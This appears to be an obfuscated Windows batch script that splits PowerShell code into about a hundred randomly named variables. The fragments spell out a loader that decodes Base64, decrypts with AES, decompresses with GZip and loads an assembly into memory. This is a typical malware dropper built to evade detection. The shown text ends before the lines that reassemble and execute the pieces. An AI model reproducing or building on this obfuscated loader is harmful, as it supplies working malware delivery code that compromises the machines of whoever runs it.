@echo off
set "iZuKHjBqoQ=[Sys"
set "vwYNzjpJDP=Hx.D"
set "xVmFfbVtYM=rtS4"
set "MtOyURtcEy=Syst"
set "iWIRhGoVxg=Star"
set "BnuEFMwjNT=ode]"
set "hSwEoYKzKV=k; }"
set "aTSzyInthW=rC ="
set "UHWYbLUqdM=ke($"
set "icopXebRMo=nage"
set "XuBIpXwjXK=le  "
set "cSQsIAVrAR=yTo("
set "CZBYbgaDrY=YmEJ"
set "zlImtWbYvG=oL'["
set "tWnVAEhxcC=join"
set "QOgAleCMWa=6] -"
set "dGeolzYbQW=bstr"
set "ZWbQZYJBrX= = $"
set "UsJnSGeAJj=y.Cr"
set "qhAVRRmBti=ion."
set "RfHqRLtOSk===')"
set "GlwAYKlHOz=$DDv"
set "DbhsyrOtVu=urit"
set "IOztBzSvoD=C, 0"
set "EJzgKTgHRn=yste"
set "MIyJSiTlRr=7;$z"
set "GHlPpeVKhK= [st"
set "uBMgQWxovU=ss -"
set "aAzehgMjUs=Fina"
set "hpucJDcJjD=.Dis"
set "aUDduDPBiK=null"
set "MSdvmxwRcV=ress"
set "HJmrOZsVQi=-Obj"
set "KNoxZlMxuD= '')"
set "sznwwoPgJd=ewLi"
set "nyveFoysgD=();$"
set "CcqMVdonUx=yste"
set "vBrXHoXNjF=1] -"
set "paAYfoiLeF=ypto"
set "TMdidVznog=Secu"
set "teGZkEMikg=hy.A"
set "OuDgrNCUdc=bjec"
set "zPWqHaffmn=)) {"
set "surqHRnJoq=se()"
set "KbJUIXKquh=..-1"
set "LRwHHpncby=ress"
set "pwORLWbpHU=y.Ci"
set "QmpCKilftZ=-joi"
set "KEPRonmpGe=t Sy"
set "qmDSNUZEwf=.GZi"
set "bRfxtnaXHh=gjYA"
set "NYotGoobld=p) {"
set "VGAecQUoVM=DZNB"
set "NBgfEgtLGm= [Sy"
set "lbTaIhWghD=ose("
set "juQQkyZBmm=PKCS"
set "hBnsQmMvlb=s75K"
set "XNyGNABimA=gsYZ"
set "useZfXJtfU=$jew"
set "TNUdXIrKDH=raph"
set "wJnCnYbJZA=dj0C"
set "DkzVZNGcnY=comp"
set "ZGMznnTHVL=tS46"
set "mpSVnKqRNj=DvrC"
set "xKYhuLnWDm=tem."
set "cQNhjPecPF=flec"
set "CUwWAxulXo=e = "
set "eOfPGmCOqz=m.IO"
set "kBJvYUEjQh=$CJQ"
set "cGOhWNKNtq=l5E7"
set "qTnEqwxTJX=gth)"
set "CffogktScH=comm"
set "ldjErzpDNf=gnir"
set "mGxauOHVPH=ct S"
set "DIZgQjCzgR='[-1"
set "wnXpGxsrtr=hxVE"
set "QWHDinnupC=TllA"
set "dapnZzKTnC=::De"
set "jyWkqQvCCT=nEd."
set "TdphuhuKXb=);$C"
set "gpBxbXbVOj=vert"
set "vbgSEsbjjy=[Sys"
set "xEZNvaIeGN=Comp"
set "UHcLpPRbUM=.Com"
set "ctCybhIiiW=oryS"
set "OzckbeuHKN=.Cry"
set "sgNRbmPoVL=.Len"
set "gdutdrPana=fore"
set "ukzzQoeUtf=beU "
set "TUdZDmUXta=morF"
set "mmsihUbCiI=pStr"
set "nOiMHvXuLI=rans"
set "SbsleKUEYC=DDvr"
set "KhbOUkjucj=mory"
set "ybfGHwBCXV=m.Re"
set "QXfKpxAMCn=$DZN"
set "cxxEveDGEa=$VRn"
set "tuLTudcmvS=tsWi"
set "JUvTMLvKhg=onve"
set "xPrRAEaXEg=grap"
set "xMuHHgpTtD=.Ass"
set "TtvqyPtbLd=zHhH"
set "VUxwxqvfzd=('da"
set "xllmsoMEhS=rofi"
set "KpjgxqDQLT=($BS"
set "hfVWZUygaR=);$G"
set "sOGKXazYnM=Stre"
set "mKXnGAwHqJ=.Mem"
set "xodkLnsxhv=  $e"
set "EUEkJLpLng=th('"
set "vsAzgiXubr=BzfO"
set "yvNtRKVImU=ddin"
set "XopmefZbBW=);$E"
set "mIhXeebofP==');"
set "bATdwdxusX=m.IO"
set "iYQWFnMLJg=oin "
